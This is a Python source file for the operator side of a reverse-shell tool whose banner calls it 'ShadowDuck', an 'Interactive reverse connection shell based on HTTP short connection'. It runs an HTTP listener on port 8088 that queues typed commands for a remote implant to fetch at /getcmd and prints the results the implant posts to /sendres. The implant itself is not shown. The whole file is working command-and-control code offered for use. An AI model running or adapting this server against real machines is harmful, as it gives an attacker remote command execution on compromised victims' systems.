from http.server import HTTPServer, BaseHTTPRequestHandler
import sys, queue, time, threading, readline, os

mq = queue.Queue()
host = ('', 8088)
SYSTEM_STATE = 'live'


class ExecuteServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/getcmd':
            self.getcmd_handler()
        if self.path == '/connect':
            self.connect_handler()
        if self.path == '/exit':
            self.exit_handler()


    def do_POST(self):
        if self.path == '/sendres':
            self.sendres_handler()

    def log_message(self, format, *args):
        pass

    def connect_handler(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
        except:
            pass

    def exit_handler(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            global SYSTEM_STATE
            SYSTEM_STATE = 'die'
        except:
            pass

    def getcmd_handler(self):
        try:
            if not mq.empty():
                data = mq.get()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data.encode())
            else:
                self.send_response(404)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
        except:
            pass

    def sendres_handler(self):
        content_len = int(self.headers.get('Content-Length'))
        post_body = self.rfile.read(content_len)
        sys.stdout.write(post_body.decode())
        sys.stdout.flush()
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

class Logo():
    def __init__(self):
        pass

    def print_color(self, string, fore = '', mode = '', back = '', ends = ''):
        style = ';'.join([s for s in [mode, fore, back] if s])
        style = '\033[%sm' % style if style else ''
        _end   = '\033[0m'
        print('%s%s%s' % (style, string, _end), end = ends)

    def logred(self, string):
        self.print_color(string, fore = '31', ends='\n')

    def logyellow(self, string):
        self.print_color(string, fore = '33', ends='\n')

    def logblue(self, string):
        self.print_color(string, fore = '36')

    def show(self):
        self.logblue('     _____ __              __             ');self.logyellow('    ____             __     ')
        self.logblue('    / ___// /_  ____ _____/ /___ _      __');self.logyellow('   / __ \__  _______/ /__   ')
        self.logblue('    \__ \/ __ \/ __ `/ __  / __ \ | /| / /');self.logyellow('  / / / / / / / ___/ //_/   ')
        self.logblue('   ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / ');self.logyellow(' / /_/ / /_/ / /__/ ,<      ')
        self.logblue('  /____/_/ /_/\__,_/\__,_/\____/|__/|__/  ');self.logyellow('/_____/\__,_/\___/_/|_|     ')
        print('                                                                      ')
        self.logred('  Interactive reverse connection shell based on HTTP short connection ')
        self.logred('                                                                      ')
        self.logred('   version: 1.0                                           By t1ddl3r  ')
        self.logred('                                                                      ')


def start_execute_server():
    server = HTTPServer(host, ExecuteServer)
    print(" [+] Starting server, listen at port %s" % host[1])
    server.serve_forever()

def main():
    logo = Logo()
    logo.show()
    t = threading.Thread(target=start_execute_server)
    t.setDaemon(True)
    t.start()
    while SYSTEM_STATE == 'live':
        data = input('')
        mq.put(data)

if __name__ == '__main__':
    main()